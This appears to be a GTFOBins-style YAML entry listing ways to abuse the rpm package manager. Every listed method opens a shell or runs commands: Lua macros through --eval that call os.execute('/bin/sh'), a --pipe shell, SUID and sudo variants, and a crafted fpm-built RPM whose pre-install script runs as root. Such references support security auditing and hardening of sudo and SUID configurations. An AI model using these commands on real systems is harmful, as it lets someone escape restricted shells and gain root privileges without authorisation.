---
functions:
  shell:
    - code: rpm --eval '%{lua:os.execute("/bin/sh")}'
    - code: rpm --pipe '/bin/sh 0<&1'
  limited-suid:
    - code: ./rpm --eval '%{lua:os.execute("/bin/sh")}'
  sudo:
    - code: sudo rpm --eval '%{lua:os.execute("/bin/sh")}'
    - description: |
        It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
        ```
        TF=$(mktemp -d)
        echo 'id' > $TF/x.sh
        fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
        ```
      code: |
        sudo rpm -ivh x-1.0-1.noarch.rpm
---
